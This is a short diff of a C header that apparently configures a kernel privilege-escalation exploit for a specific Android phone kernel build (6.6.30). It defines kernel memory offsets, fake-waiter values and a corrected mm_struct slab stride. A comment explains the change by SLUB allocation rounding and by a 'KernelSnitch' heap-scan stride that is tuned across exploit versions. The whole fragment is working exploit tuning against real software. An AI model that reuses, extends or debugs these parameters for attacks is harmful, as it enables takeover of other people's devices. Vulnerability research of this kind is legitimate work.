@@ -15,10 +15,12 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
-/* sizeof(struct mm_struct) on 6.6.30-abogkiS938BXXS5AYG4 — verified
- * against BTF id=371.  Do NOT inherit the common.h 0x500 default; that
- * value is from an older 5.x family. */
-#define MM_STRUCT_SZ 0x4c0
+#define MM_STRUCT_SZ 0x500
+/* This is the SLUB object stride, not sizeof(struct mm_struct).
+ * BTF says sizeof = 0x4c0, but the kernel allocates
+ *   sizeof + cpumask_size() = 0x4c8, rounded to HWCACHE_ALIGN = 0x500.
+ * Setting it to 0x4c0 desyncs objs_per_slab (25 -> 26) and the
+ * KernelSnitch scan stride. Verified empirically v33 vs v35. */
 #define SKB_DATA_DELTA (-0xe80LL)
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
